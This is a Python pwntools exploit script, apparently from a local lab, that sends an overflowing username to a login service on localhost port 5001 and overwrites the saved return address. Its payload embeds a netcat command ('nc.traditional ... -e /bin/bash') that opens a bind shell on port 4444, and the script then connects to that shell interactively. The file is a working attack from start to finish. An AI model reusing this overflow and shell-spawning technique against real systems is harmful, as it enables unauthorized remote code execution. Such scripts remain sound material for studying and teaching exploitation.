#!/usr/bin/python3

import time
import struct
import sys
import argparse
from pwn import *

gdbStr = '''
set follow-fork-mode child
{}
continue
'''

def main():
    print("Dont forget to start the server in the background")
    context.update(arch='amd64', os='linux')

    parser = argparse.ArgumentParser()
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument("--address", type=str)
    parser.add_argument("--gdb", nargs='?', default="", type=str)
    args = parser.parse_args()

    io = remote("localhost", 5001)
    gdb.attach(io, gdbStr.format(args.gdb))

    if args.address is None:
        print("--[ Send pattern")
        pattern = makePattern(args.offset)
        print(hexdump(pattern, skip=False))

        io.sendafter(b"Username: ", pattern)
        io.sendafter(b"Password: ", b"password")
        io.recvall()
        #io.wait()
        return

    else:
        print("--[ Send exploit")
        exploit = makeExploit(args.offset, int(args.address, 16), buf_size=256)
        print(hexdump(exploit, skip=False))

        io.sendafter(b"Username: ", exploit)
        io.sendafter(b"Password: ", b"password")
        #io.recvall()
        checkShell()
        return

def makePattern(offset):
    pattern = b'XXXX'
    pattern += b'A' * (offset - 4)
    pattern += b'BBBB' # RIP
    return pattern

def makeExploit(offset, address, buf_size=128, nop=b' '):
    # bash bind shell to 0.0.0.0:4444 using openbsd-netcat
    shellcode = b'nc.traditional -nlp 4444 127.0.0.1 -e /bin/bash #'
    exploit = nop * (buf_size - len(shellcode))
    exploit += shellcode
    exploit += b'A' * (offset - len(exploit))
    exploit += p64(address)
    return exploit

def checkShell():
    time.sleep(0.5)
    try:
        ioShell = remote("127.0.0.1", 4444)
        ioShell.interactive()
    except Exception as e:
        print("Error: Remote shell not started.")
        pass

if __name__ == '__main__':
        main()
